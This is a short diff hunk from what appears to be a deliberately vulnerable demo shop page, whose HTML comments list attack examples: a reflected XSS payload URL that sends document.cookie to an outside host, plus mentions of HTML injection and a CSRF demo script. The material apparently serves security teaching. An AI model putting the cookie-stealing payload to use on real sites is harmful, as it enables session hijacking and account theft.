@@ -175,6 +175,8 @@ if (mysql_num_rows($r) == 0) {
 <!-- Chrome has AntiXSS filter so cool - http://blog.securitee.org/?p=37 -->
 <!-- Steal cookies using XSS -->
 <!-- http://amazon.two/product.php?product=%3Cscript%3Enew%20Image%28%29.src=%22http://google.com%22%3C/script%3E-->
+
+<!-- add this as comment to show xss attack -->
 <!-- http://amazon.two/product.php?product=<script>new Image().src="http://good.site/iamgood/showimage.php?"+document.cookie</script> -->
 <!-- html injection vulnerability for breadcrumb -->
 <!-- python script to demonstrate CSRF vulnerability-->
